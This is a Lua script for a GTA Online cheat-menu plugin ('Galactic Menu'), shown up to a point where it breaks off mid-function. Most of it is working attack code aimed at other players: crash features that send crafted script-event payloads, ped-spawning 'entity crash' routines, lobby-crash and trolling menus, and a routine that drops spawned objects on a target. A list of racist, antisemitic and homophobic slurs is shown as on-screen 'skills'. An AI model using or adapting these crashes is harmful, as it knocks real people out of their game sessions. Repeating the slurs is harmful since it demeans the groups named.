ui.notify_above_map("Loading GALACTIC MENU", "Important", 215)
menu.notify("Welcome "..os.getenv("USERNAME").." to Galactic Menu", "Galactic Menu", 9, 80)

require("Galactic-Menu\\Lyrics")
require("Galactic-Menu\\LyricsSong")
require("Galactic-Menu\\ChatSpam")

local pedLocals = player.get_player_ped(player.player_id())
local pped
-----------------------------
login_start=true
-----------------------------
Objs = {
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"10"
}

local function crazyRain(context)
    while context.feat.on do
		local id = entity.get_entity_bone_index_by_name(player.get_player_ped(context.pid), "IK Head")
        local pos_start = v3()
        pos_start = player.get_player_coords(context.pid)
        pos_start.z = pos_start.z + 30.0
        local pos_end = player.get_player_coords(context.pid)
        local offset = v3()
        offset.x = math.random(-5,5)
        offset.y = math.random(-5,5)
		
        local ob = object.create_object(gameplay.get_hash_key("prop_elecbox_11"), pos_end + offset, true, true)
		local ob1 = object.create_object(gameplay.get_hash_key("prop_ld_int_safe_01"), pos_end + offset, true, true)
		local ob2 = object.create_object(gameplay.get_hash_key("prop_devin_box_dummy_01"), pos_end + offset, true, true)
		local ob3 = object.create_object(gameplay.get_hash_key("ch_prop_ch_diamond_xmastree"), pos_end + offset, true, true)
		local ob4 = object.create_object(gameplay.get_hash_key("bkr_prop_clubhouse_jukebox_01a"), pos_end + offset, true, true)
		local ob5 = object.create_object(gameplay.get_hash_key("prop_elecbox_11"), pos_end + offset, true, true)
		local ob6 = object.create_object(gameplay.get_hash_key("prop_devin_box_dummy_01"), pos_end + offset, true, true)
		local ob7 = object.create_object(gameplay.get_hash_key("prop_elecbox_11"), pos_end + offset, true, true)
		local veh_spawn = vehicle.create_vehicle(0x15F27762, pos_end + offset, pos_start.z, true, false)
		local veh_spawn1 = vehicle.create_vehicle(0x4FAF0D70, pos_end + offset, pos_start.z, true, false)
		local veh_spawn2 = vehicle.create_vehicle(0x810369E2, pos_end + offset, pos_start.z, true, false)
		entity.set_entity_god_mode(ob, true)
		entity.set_entity_god_mode(ob1, true)
		entity.set_entity_god_mode(ob2, true)
		entity.set_entity_god_mode(ob3, true)
		entity.set_entity_god_mode(ob4, true)
		entity.set_entity_god_mode(ob5, true)
		entity.set_entity_god_mode(ob6, true)
		entity.set_entity_god_mode(ob7, true)
		entity.set_entity_god_mode(veh_spawn, true)
		entity.set_entity_god_mode(veh_spawn1, true)
		entity.set_entity_god_mode(veh_spawn2, true)
			system.wait(5000)
		attach_entity_to_entity(ob, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob1, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob2, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob3, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob4, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob5, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob6, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(ob7, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(veh_spawn, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(veh_spawn1, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		attach_entity_to_entity(veh_spawn2, player.get_player_ped(pid), id, pos_start, pos_start.z, true, true, true, 1, true)
		
			system.wait(10000)
		entity.delete_entity(ob)
		entity.delete_entity(ob1)
		entity.delete_entity(ob2)
		entity.delete_entity(ob3)
		entity.delete_entity(ob4)
		entity.delete_entity(ob5)
		entity.delete_entity(ob6)
		entity.delete_entity(ob7)
		entity.delete_entity(veh_spawn)
		entity.delete_entity(veh_spawn1)
		entity.delete_entity(veh_spawn2)
    end
end
------------------ parent mains below  ----------------------------------------

local main = menu.add_feature("Galactic_Lobby","parent",0)

local galactic = menu.add_player_feature("Galactic_Player", "parent", 0)

------------------ parent mains above ---------------------------------------------

---------------------galactic menu PLAYER MAIN below-------------------------------

local crash = menu.add_player_feature("Crashes", "parent", galactic.id)

local sub = menu.add_player_feature("Explosions", "parent", galactic.id)

local misc = menu.add_player_feature("Misc", "parent", galactic.id)

local attach = menu.add_player_feature("Attach", "parent", galactic.id)

local ChatspamA = menu.add_player_feature("Chat", "parent", galactic.id)

local info_stuff = menu.add_player_feature("Info", "parent", galactic.id)

local ceomc = menu.add_player_feature("Ceo/MC", "parent", galactic.id)

local trolling = menu.add_player_feature("Trolling", "parent", galactic.id)

local trolling2 = menu.add_player_feature("Trolling 2", "parent", galactic.id)

local at0mic = menu.add_player_feature("at0mic", "parent", galactic.id)

local Cars11 = menu.add_player_feature("Cars", "parent", galactic.id)


-------------- GALACTIC MENU PLAYER MAINS ABOVE -----------------------------------------


---------------- GALACTIC MENU LOBBY MAINS BELOW ----------------------------------------

local lobbie = menu.add_feature("Lobby", "parent", main.id)

local lobbycrash = menu.add_feature("Crash Lobbies", "parent", main.id)

local selfplayer = menu.add_feature("Self Stuff", "parent", main.id)

local lobbychat = menu.add_feature("Lobby Chat", "parent", main.id)

local lobbymisc = menu.add_feature("Lobby Misc", "parent", main.id)

local lobbytroll = menu.add_feature("Lobby Troll", "parent", main.id)

local lobbrecovery = menu.add_feature("Recovery", "parent", main.id)

local protections = menu.add_feature("Protections", "parent", main.id)

local main_settings = menu.add_feature("Settings","parent",main.id)

---------------- GALACTIC MENU LOBBY MAINS ABOVE ----------------------------------------


----------------------main_targets-------------------------------



local main_title_info={
    "|",
    "|Θ",
    "G",
    "G|",
    "G||",
    "Ga",
    "Ga|",
    "Gal",
    "Gal||",
    "Gal",
    "Gal",
    "Gal\\",
    "Gal\\/",
    "Gal\\/",
    "Gala",
    "Galaₑ",
    "Galaₔ",
    "Galac",
    "Galac|",
    "Galac|}",
    "Galact",
    "Galact1",
    "Galacti^",
    "Galacti",
    "Galactiₑ",
    "Galactiₔ",
    "Galactic",
    "Galactic-",
    "Galactic_",
    "Galactic_*",
    "Galactic_*^",
    "Galactic_M",
    "Galactic_M\\",
    "Galactic_M\\/",
    "Galactic_M\\/|",
    "Galactic_ME",
    "Galactic_ME*",
    "Galactic_M3*^",
    "Galactic_MEN",
    "Galactic_M3N",
    "Galactic_M3N^",
    "Galactic_MENU",
    "Galactic_ME",
    "Galactic_M\\/|",
    "Galactic_M\\/",
    "Galactic_M\\",
    "Galactic_M",
    "Galactic_M^",
    "Galactic_M",
    "Galactic_",
    "Galactic-",
    "Galactic",
    "Galactiₔ",
    "Galactiₑ",
    "Galacti",
    "Galact$^",
    "Galact$",
    "Galact",
    "Galac|}",
    "Galac|",
    "Galac",
    "Galaₔ",
    "Galaₑ",
    "Gala",
    "Gal\\/",
    "Gal\\/",
    "Gal\\",
    "Gal",
    "Gal",
    "Gal||",
    "Gal",
    "Ga|",
    "Ga",
    "G||",
    "G|",
    "G",
    "|Θ",
    "|"
}
local main_title_nl={
    "|",
    "|\\",
    "|\\|",
    "N",
    "N3",
    "Ne",
    "Ne\\",
    "Ne\\/",
    "Nev",
    "Nev3",
    "Neve",
    "Neve|",
    "Neve|2",
    "Never|",
    "Neverl",
    "Neverl4",
    "Neverlo",
    "Neverlos|",
    "Neverlos|D",
    "Neverlos",
    "Neverlose",
    "Neverlose.",
    "Neverlose.<",
    "Neverlose.c",
    "Neverlose.c<",
    "Neverlose.cc",
    "Neverlose.cc",
    "Neverlose.c<",
    "Neverlose.c",
    "Neverlose.<",
    "Neverlose.",
    "Neverlose",
    "Neverlo|D",
    "Neverlo|",
    "Neverlo_",
    "Neverl4",
    "Nevelo",
    "Neverl_",
    "Never|",
    "Never_",
    "Neve|2",
    "Neve|",
    "Neve_",
    "Nev3",
    "Nev_",
    "Ne\\/",
    "Ne\\",
    "Ne_",
    "N3",
    "N_",
    "|\\|",
    "|\\",
    "|"
}

local main_title_ga={
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "1",
    "2",
    "3",
    "4",
}
local main_title_sk={
    "             cx",
    "            cxr",
    "           cxrr",
    "          cxrru",
    "         cxrrup",
    "        cxrrupt",
    "       cxrrupt ",
    "      cxrrupt O",
    "     cxrrupt OP",
    "    cxrrupt OP ",
    "   cxrrupt OP A",
    "  cxrrupt OP AS",
    " cxrrupt OP ASF",
    "cxrrupt OP ASF ",
    "cxrrupt OP ASF ",
    "cxrrupt OP ASF ",
    "xrrupt OP ASF  ",
    "rrupt OP ASF   ",
    "rupt OP ASF    ",
    "upt OP ASF     ",
    "pt OP ASF      ",
    "t OP ASF       ",
    "  OP ASF       ",
    " OP ASF        ",
    "OP ASF         ",
    "               "
}

local main_title_2T={
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "1",
    "2",
    "2A",
    "2B",
    "2C",
    "2D",
    "2E",
    "2F",
    "2G",
    "2H",
    "2I",
    "2J",
    "2K",
    "2L",
    "2M",
    "2N",
    "2O",
    "2P",
    "2Q",
    "2R",
    "2S",
    "2T",
    "2U",
    "2V",
    "2W",
    "2X",
    "2Y",
    "2Z",
    "2A",
    "2B",
    "2C",
    "2D",
    "2E",
    "2F",
    "2G",
    "2H",
    "2I",
    "2J",
    "2K",
    "2L",
    "2M",
    "2N",
    "2O",
    "2P",
    "2Q",
    "2R",
    "2S",
    "2T",
    "2TA",
    "2TB",
    "2TC",
    "2TD",
    "2TE",
    "2TF",
    "2TG",
    "2TH",
    "2TI",
    "2TJ",
    "2TK",
    "2TL",
    "2TM",
    "2TN",
    "2TO",
    "2TP",
    "2TQ",
    "2TR",
    "2TS",
    "2TT",
    "2TU",
    "2TV",
    "2TW",
    "2TX",
    "2TY",
    "2TZ",
    "2TA",
    "2TAA",
    "2TAB",
    "2TAC",
    "2TAD",
    "2TAE",
    "2TAF",
    "2TAG",
    "2TAH",
    "2TAI",
    "2TAJ",
    "2TAK",
    "2TAL",
    "2TAM",
    "2TAN",
    "2TAO",
    "2TAP",
    "2TAQ",
    "2TAR",
    "2TAS",
    "2TAT",
    "2TAU",
    "2TAV",
    "2TAW",
    "2TAX",
    "2TAY",
    "2TAZ",
    "2TAA",
    "2TAB",
    "2TAC",
    "2TAD",
    "2TAE",
    "2TAF",
    "2TAG",
    "2TAH",
    "2TAI",
    "2TAJ",
    "2TAK",
    "2TAKA",
    "2TAKB",
    "2TAKC",
    "2TAKD",
    "2TAKE",
    "2TAKF",
    "2TAKG",
    "2TAKH",
    "2TAKI",
    "2TAKJ",
    "2TAKK",
    "2TAKL",
    "2TAKM",
    "2TAKN",
    "2TAKO",
    "2TAKP",
    "2TAKQ",
    "2TAKR",
    "2TAKS",
    "2TAKT",
    "2TAKU",
    "2TAKV",
    "2TAKW",
    "2TAKX",
    "2TAKY",
    "2TAKZ",
    "2TAKA",
    "2TAKB",
    "2TAKC",
    "2TAKD",
    "2TAKE",
    "2TAKE1",
    "2TAKE2",
    "2TAKE3",
    "2TAKE4",
    "2TAKE5",
    "2TAKE6",
    "2TAKE7",
    "2TAKE8",
    "2TAKE9",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKE1",
    "2TAKZ",
    "2TAKY",
    "2TAKX",
    "2TAKW",
    "2TAKV",
    "2TAKU",
    "2TAKT",
    "2TAKS",
    "2TAKR",
    "2TAKQ",
    "2TAKP",
    "2TAKO",
    "2TAKN",
    "2TAKM",
    "2TAKL",
    "2TAKK",
    "2TAKJ",
    "2TAKI",
    "2TAKH",
    "2TAKG",
    "2TAKF",
    "2TAKE",
    "2TAKD",
    "2TAKC",
    "2TAKB",
    "2TAKA",
    "2TAZ",
    "2TAY",
    "2TAX",
    "2TAW",
    "2TAV",
    "2TAU",
    "2TAT",
    "2TAS",
    "2TAR",
    "2TAQ",
    "2TAP",
    "2TAO",
    "2TAN",
    "2TAM",
    "2TAL",
    "2TAK",
    "2TAJ",
    "2TAI",
    "2TAH",
    "2TAG",
    "2TAF",
    "2TAE",
    "2TAD",
    "2TAC",
    "2TAB",
    "2TAA",
    "2TZ",
    "2TY",
    "2TX",
    "2TW",
    "2TV",
    "2TU",
    "2TT",
    "2TS",
    "2TR",
    "2TQ",
    "2TP",
    "2TO",
    "2TN",
    "2TM",
    "2TL",
    "2TK",
    "2TJ",
    "2TI",
    "2TH",
    "2TG",
    "2TF",
    "2TE",
    "2TD",
    "2TC",
    "2TB",
    "2TA",
    "2Z",
    "2Y",
    "2X",
    "2W",
    "2V",
    "2U",
    "2T",
    "2S",
    "2R",
    "2Q",
    "2P",
    "2O",
    "2N",
    "2M",
    "2L",
    "2K",
    "2J",
    "2I",
    "2H",
    "2G",
    "2F",
    "2E",
    "2D",
    "2C",
    "2B",
    "2A",
    "9",
    "8",
    "7",
    "6",
    "5",
    "4",
    "3",
    "2",
    "1",
    "2",
    "2T",
    "2TA",
    "2TAK",
    "2TAKE",
    "2TAKE1",
    "2TAKE1 ",
    "2TAKE1 Y",
    "2TAKE1 YY",
    "2TAKE1 YYD",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "           ",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYDS",
    "2TAKE1 YYD",
    "2TAKE1 YY",
    "2TAKE1 Y",
    "2TAKE1",
    "2TAKE",
    "2TAK",
    "2TA",
    "2T",
    "2"
}

----------------------------------------------------------------
---------- TESTING THIS NEW

----------------------------------------------------------------

----------------------------on_start----------------------------


local main_title=menu.add_feature(
    "Animation",
    "value_str",
    main_settings.id,
    function(a)
        while a.on do
            system.yield(0)
            if a.on then
                if a.value==0 then
                    for i=1, #main_title_info do
                        if a.on then
                            main.name=main_title_info[i]
                            system.yield(100)
                        else
                            main.name='Galactic_Menu'
                        end
                    end
                elseif a.value==1 then
                    for i=1, #main_title_nl do
                        if a.on then
                            main.name=main_title_nl[i]
                            system.yield(150)
                        else
                            main.name='Galactic_Menu'
                        end
                    end
                elseif a.value==2 then
                    for i=1, #main_title_sk do
                        if a.on then
                            main.name=main_title_sk[i]
                            system.yield(300)
                        else
                            main.name='Galactic_Menu'
                        end
                    end
                elseif a.value==3 then
                    for i=1, #main_title_2T do
                        if a.on then
                            main.name=main_title_2T[i]
                            system.yield(10)
                        else
                            main.name='Galactic_Menu'
                        end
                    end
                end
            else
                main.name='Galactic_Menu'
            end
        end
    end
)
main_title:set_str_data({
    "Galactic_Menu",
    "NeverLose",
    "Cxrrupt",
    "2Take1",
})


main_title.threaded=true
--main_title.hidden=true


local on_start_text=menu.add_feature(
    "这是你看不见的",
    "toggle",
    main.id,
    function(a)
        local i=0
        
        while a.on do
            system.yield(0)
            ui.set_text_color(i*10,i*2,100-i, 255)				
            ui.set_text_scale(1)
            ui.set_text_font(7)
            ui.set_text_centre(true)
            ui.set_text_outline(true)
            ui.draw_text("GALACTIC-MENU",v2(0.5,0.3))
            i=i+10
        end
    end
)
on_start_text.hidden=true
on_start_text.threaded=true
local skills={
    "\nNigga Killa",
    "\nJew Killa",
    "\nRussian Crybabies",
    "\nHomosexual SkinPeeler",
    "\nGangBang Crash Addict",
    "\nThot Simp",
    "\nTim Speckhals Killa",
    "\nTim Speckhals Doxxaa",
    "\nTim Speckhals Victim",
    "\nTrump Ass Sniffaa",
    "\nOtto"
}


local on_start_end=menu.add_feature(
    "This is invisible to you",
    "toggle",
    main.id,
    function(a)
        local month=os.date("%B")
        local today=os.date("%d")
        local date=month..''..today..'Day'
        local i=255
        local x=0
        local randomthing=math.random(1,#skills)
        main_title.on=true
        while a.on and i>0 do
            system.yield(0)
            ui.set_text_color(100-x,x*10, x*10, i)					
            ui.set_text_scale(1)
            ui.set_text_font(7)
            ui.set_text_centre(true)
            ui.set_text_outline(true)
            ui.draw_text("Developed By Cxrrupt\n Credit to everyone who helped!!".. '\nSkill:'..skills[randomthing],v2(0.5,0.3))
            system.wait(10)
            i=i-1
            x=x+1
        end
    end
)
on_start_end.hidden=true
on_start_end.threaded=true
local on_start=menu.add_feature(
    "This is invisible to you",
    "action",
    main.id,
    function()
        local me=player.player_id()
        local my_ped=player.get_player_ped(me)
        time.set_clock_time(23, 0, 0)
        entity.set_entity_coords_no_offset(my_ped, v3(-1006.402, 6272.383, 1.503))
        on_start_text.on=true
        graphics.set_next_ptfx_asset("scr_trevor1")
        while not graphics.has_named_ptfx_asset_loaded("scr_trevor1") do
            graphics.request_named_ptfx_asset("scr_trevor1")
            system.wait(0)
        end
        system.wait(4000)
        graphics.set_next_ptfx_asset("scr_trevor1")
        while not graphics.has_named_ptfx_asset_loaded("scr_trevor1") do
            graphics.request_named_ptfx_asset("scr_trevor1")
            system.wait(0)
        end
        graphics.start_ptfx_looped_on_entity("scr_trev1_trailer_boosh", my_ped, v3(0, 0.0, 0.0), v3(0, 0, 0), 2)
        system.wait(1)
        fire.add_explosion(v3(-50, -819.27, 326.175), 0, true, false, 0, my_ped)
        system.wait(1)
        time.set_clock_time(12, 0, 0)
        on_start_text.on=false
        on_start_end.on=true
        system.wait(4000)
        on_start_end.on=false
    end
)
on_start.hidden=true

--------------------toggle_targets------------------------------
spec_osd = menu.add_feature("Spectate OSD", "toggle", main_settings.id, function(feat)
	if feat.on then
	local pos = v2()
	pos.x = 0.15
	pos.y = .03
	
	for i = 0, 32 do
	if player.is_player_spectating(i) and player.is_player_playing(i) and interior.get_interior_from_entity(player.get_player_ped(i)) == 0 then
	local target = network.get_player_player_is_spectating(i)
	local name, targetname = ("~r~~h~" .. player.get_player_name(i)), ("~h~~g~" .. player.get_player_name(target))
	pos.y = pos.y + 0.05
	ui.set_text_scale(0.255)
	ui.set_text_font(0)
	ui.set_text_color(255, 255, 255, 255)
	ui.set_text_centre(0)
	ui.set_text_outline(1)
	ui.draw_text("~h~~b~Modded Specate:\t: " .. name .. "\t~w~ Spectating:\t " .. targetname, pos)


end	
	end
	return HANDLER_CONTINUE	
	end
end)
spec_osd.on = true


local host_info = menu.add_feature("Host Info", "toggle", main_settings.id, function(a)
    local rgb = {math.random(0,255), math.random(0,255), math.random(0,255)}
    while a.on do
        local plyrinfotxt = {}
        system.yield(0)
        for pid = 0,31 do
            if player.is_player_valid(pid) then
                plyrinfotxt[player.get_player_host_priority(pid)] = player.get_player_host_priority(pid)..". "..player.get_player_name(pid).."\n"
            end
        end
        for i = 1, 5 do
            plyrinfotxt[i] = plyrinfotxt[i] or ""
        end
        ui.draw_rect(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
        ui.set_text_color(rgb[1], rgb[2], rgb[3], 255)                
        ui.set_text_scale(0.35)
        ui.set_text_font(0)
        ui.set_text_centre(false)
        ui.set_text_outline(true)
        ui.draw_text(plyrinfotxt[1]..plyrinfotxt[2]..plyrinfotxt[3]..plyrinfotxt[4]..plyrinfotxt[5]..'Position: '..player.get_player_host_priority(player.player_id()), v2(0.8,0.3))
    end
end)
host_info.on = true

menu.add_feature("check version", "action", main_settings.id, function()
    menu.notify("V1.9.4(public)", "Galactic Menu Ver", 1, 10)
    menu.notify("CxrruptSensation#0911", "Developer", 1, 2)
    menu.notify("Rimuru, GhostOne, Duerccio, Matthew123 and more!", "Special thanks to", 1, 200)
  end)

local time_title=menu.add_feature(
    "时间信息",
    "toggle",
    main_settings.id,
    function(a)
        local r,g,b=math.random(0,255),math.random(0,255),math.random(0,255)
        while a.on do
            system.yield(0)
            local date=os.date("%Y-%m-%d %H:%M:%S")
            ui.draw_rect(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
            ui.set_text_color(r,g,b, 255)				
            ui.set_text_scale(0.5)
            ui.set_text_font(7)
            ui.set_text_centre(true)
            ui.set_text_outline(true)
            ui.draw_text(date,v2(0.8,0))
        end
    end


)
time_title.threaded=true
time_title.hidden=true
------------ HACKS START BELOW ----------------------------------
menu.add_player_feature("Player Crash v1", "action", crash.id, function(feat, pid)

    script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(2092565704, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(2092565704, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    
    return HANDLER_POP
end)


menu.add_player_feature("Player Crash v2", "action", crash.id, function(feat, pid)

    script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x9260c0a, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x8fdcc4d2, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0xcbb6ce33, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x3d9faec5, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x4a72a08d, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x8638a0ab, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x12d09136, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
    script.trigger_script_event(0x9260c0a, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x8fdcc4d2, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0xcbb6ce33, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x3d9faec5, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x4a72a08d, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x12d09136, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
    script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})

    return HANDLER_POP
end)

menu.add_player_feature("Invalid Entity Crash ", "action",crash.id, function(feat, pid)
    menu.notify("Sent Invalid Entity Crash (dont be near person)", "Crash Menu", 10, ff0000)
        local function createped(type, hash, pos, dir)
            streaming.request_model(hash)
            while not streaming.has_model_loaded(hash) do
            system.wait(10)
            end
            local ped = ped.create_ped(type, hash, pos, dir, true, false)
                streaming.set_model_as_no_longer_needed(hash)
                return ped
            end
    pos = player.get_player_coords(pid)
    local pedp = player.get_player_ped(pid)
    pos.z = pos.z + 0.6
    
    npc1 = createped(26,0x2D7030F3,pos,0)
    entity.attach_entity_to_entity(npc1,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
    entity.freeze_entity(npc1, true)
    local checkcount = 0
    network.request_control_of_entity(npc1)
      while not network.has_control_of_entity(npc1) do
        system.wait(100)
        checkcount = checkcount + 1
        if checkcount > 10 then end
      end
       system.wait(2000)
    entity.delete_entity(npc1)
    
    npc2 = createped(26,0x856CFB02,pos,0)
    entity.attach_entity_to_entity(npc2,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
    entity.freeze_entity(npc2, true)
    local checkcount = 0
    network.request_control_of_entity(npc2)
      while not network.has_control_of_entity(npc2) do
        system.wait(2000)
        checkcount = checkcount + 1
        if checkcount > 10 then end
      end
       system.wait(2000)
    entity.delete_entity(npc2)
    
    npc3 = createped(26,0x856CFB02,pos,0)
    entity.attach_entity_to_entity(npc3,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
    entity.freeze_entity(npc3, true)
    local checkcount = 0
    network.request_control_of_entity(npc3)
      while not network.has_control_of_entity(npc3) do
        system.wait(100)
        checkcount = checkcount + 1
        if checkcount > 10 then end
      end
        system.wait(2000)
    entity.delete_entity(npc3)
    menu.notify("Invalid Entity crash all done!", "Entity Crash", 10, ff0000)
    end)


menu.add_player_feature("Launch minitank Cuddle Crash","action",crash.id,function(k,pid)
    menu.notify("Sent the minitank Cuddle Crash", "CRASH", 10, ff0000)
    
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    pos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,pos, 0)
    system.wait(0)
    end
    system.wait(1)
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    ppos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,ppos , 0)
    system.wait(0)
    end
    system.wait(1)
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    pppos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,pppos ,0)
    system.wait(0)
    end
    system.wait(1)
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    pppos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,pppos ,0)
    system.wait(0)
    end
    system.wait(1)
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    pppos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,pppos ,0)
    system.wait(0)
    end
    system.wait(1)
    for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    pppos = player.get_player_coords(pid)
    npc = Cped(26, 0xB53C6C52,pppos ,0)
    system.wait(0)
    end	
    menu.notify("Crash complete!(dont spectate if there still here)", "minitank Cuddle", 10, ff0000)
    end)
    

        menu.add_player_feature("Launch MS Unknown Cuddle","action",crash.id,function(k,pid)
            menu.notify("Sent the MS Unknown Cuddle", "CRASH", 10, ff0000)
                    
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) 
                pos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,pos, 0)
                system.wait(1)
                end
                system.wait(1)
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) 
                ppos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,ppos , 0)
                system.wait(1)
                end
                system.wait(1)
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) 
                pppos = player.get_player_coords(pid)
                npc = Cped(26, 0x66F34017,pppos ,0)
                system.wait(1)
                end
                system.wait(1)
                for i = 0 , 30 do ped.clear_ped_tasks_immediately(player.get_player_ped(pid)) 
